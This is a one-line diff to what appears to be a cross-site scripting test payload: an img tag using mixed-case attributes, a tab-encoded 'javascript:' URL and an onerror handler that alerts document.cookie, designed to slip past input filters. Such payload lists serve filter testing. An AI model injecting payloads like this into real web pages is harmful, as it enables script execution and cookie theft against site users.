@@ -1,1 +1,1 @@
-<ImG src="java%09script:alert('SSS')" onerror=alert(document.cookie)>
+<ImG SRc="java%09script:alert('SSS')" onerror=alert(document.cookie)>
